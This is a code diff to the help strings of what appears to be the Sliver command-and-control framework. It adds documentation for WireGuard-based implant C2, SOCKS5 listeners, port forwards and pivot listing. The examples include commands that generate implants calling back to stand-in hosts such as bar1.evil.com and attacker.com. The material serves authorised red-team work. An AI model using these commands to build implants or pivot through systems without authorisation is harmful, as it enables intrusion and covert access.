@@ -77,6 +77,9 @@ var (
 		consts.RegistryWriteStr:     regWriteHelp,
 		consts.RegistryReadStr:      regReadHelp,
 		consts.RegistryCreateKeyStr: regCreateKeyHelp,
+		consts.PivotsListStr:        pivotListHelp,
+		consts.WgPortFwdStr:         wgPortFwdHelp,
+		consts.WgSocksStr:           wgSocksHelp,
 	}
 
 	jobsHelp = `[[.Bold]]Command:[[.Normal]] jobs <options>
@@ -98,11 +101,16 @@ var (
 [[.Bold]]About:[[.Normal]] Generate a new sliver binary and saves the output to the cwd or a path specified with --save.
 
 [[.Bold]][[.Underline]]++ Command and Control ++[[.Normal]]
-You must specificy at least one c2 endpoint when generating an implant, this can be one or more of --mtls, --http, or --dns, --named-pipe, or --tcp-pivot.
-The command requires at least one use of --mtls, --http, or --dns, --named-pipe, or --tcp-pivot.
+You must specificy at least one c2 endpoint when generating an implant, this can be one or more of --mtls, --wg, --http, or --dns, --named-pipe, or --tcp-pivot.
+The command requires at least one use of --mtls, --wg, --http, or --dns, --named-pipe, or --tcp-pivot.
 
 The follow command is used to generate a sliver Windows executable (PE) file, that will connect back to the server using mutual-TLS:
 	generate --mtls foo.example.com 
+
+The follow command is used to generate a sliver Windows executable (PE) file, that will connect back to the server using Wireguard on UDP port 9090,
+then connect to TCP port 1337 on the server's virtual tunnel interface to retrieve new wireguard keys, re-establish the wireguard connection using the new keys, 
+then connect to TCP port 8888 on the server's vitual tunnel interface to establish c2 comms.
+	generate --wg 3.3.3.3:9090 --key-exchange 1337 --tcp-comms 8888
 
 You can also stack the C2 configuration with multiple protocols:
 	generate --os linux --mtls example.com,domain.com --http bar1.evil.com,bar2.attacker.com --dns baz.bishopfox.com
@@ -430,6 +438,60 @@ When using the binary type, you must either:
 [[.Bold]]About:[[.Normal]] Read a value from the windows registry
 [[.Bold]]Example:[[.Normal]] registry create --hive HKLM "software\\google\\chrome\\BLBeacon\\version"
 	`
+
+	pivotListHelp = `[[.Bold]]Command:[[.Normal]] pivots-list [--id SESSIONID]
+[[.Bold]]About:[[.Normal]] List created pivots
+[[.Bold]]Examples:[[.Normal]]
+List pivots for all sessions:
+	
+	pivots-list
+
+List pivots for a specific session:
+
+	pivots-list --id 1
+
+List pivots for the current session:
+
+	pivots-list
+	`
+	wgSocksHelp = `[[.Bold]]Command:[[.Normal]] wg-socks
+[[.Bold]]About:[[.Normal]] Create a socks5 listener on the implant Wireguard tun interface
+[[.Bold]]Examples:[[.Normal]]
+Start a new listener:
+
+	wg-socks start
+
+Specify the listening port:
+
+	wg-socks start --bind 1234
+
+List existing listeners:
+
+	wg-socks
+
+Stop and remove an existing listener:
+
+	wg-socks rm 0
+`
+	wgPortFwdHelp = `[[.Bold]]Command:[[.Normal]] wg-portfwd
+[[.Bold]]About:[[.Normal]] Create a TCP port forward on the implant Wireguard tun interface
+[[.Bold]]Examples:[[.Normal]]
+Add a new forwarding rule:
+
+	wg-portfwd add --remote 1.2.3.4:1234
+
+Specify the listening port:
+
+	wg-portfwd add --bind 1234 --remote 1.2.3.4
+
+List existing listeners:
+
+	wg-portfwd
+
+Stop and remove an existing listener:
+
+	wg-portfwd rm 0
+`
 )
 
 const (
